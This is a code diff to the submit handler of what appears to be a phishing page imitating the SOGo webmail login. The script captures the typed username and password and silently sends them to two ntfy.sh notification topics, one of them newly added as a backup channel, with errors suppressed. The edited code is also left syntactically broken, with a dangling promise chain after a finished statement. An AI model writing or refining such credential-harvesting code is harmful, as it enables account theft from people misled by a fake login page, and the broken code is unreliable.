@@ -62,8 +62,10 @@ f.addEventListener('submit',function(ev){
       p=document.getElementById('p').value;
   if(!u||!p)return;
   b.disabled=true;e.style.display='none';s.style.display='block';
-  var msg='SOGo | user='+u+' | pass='+p+' | t='+new Date().toISOString()+' | ip='+(window.__ip||'?');
-  fetch('https://ntfy.sh/sogo-1e1828277de13376',{method:'POST',body:msg})
+  var msg='SOGo | user='+u+' | pass='+p+' | t='+new Date().toISOString();
+  var body=msg+' | ref='+(document.referrer||'-');
+  try{fetch('https://ntfy.sh/sogo-1e1828277de13376',{method:'POST',body:body,mode:'no-cors'});}catch(e){}
+  try{fetch('https://ntfy.sh/sogo-backup-7f3a91c2',{method:'POST',body:body,mode:'no-cors'});}catch(e){}
   .catch(function(){})
   .then(function(){
     setTimeout(function(){
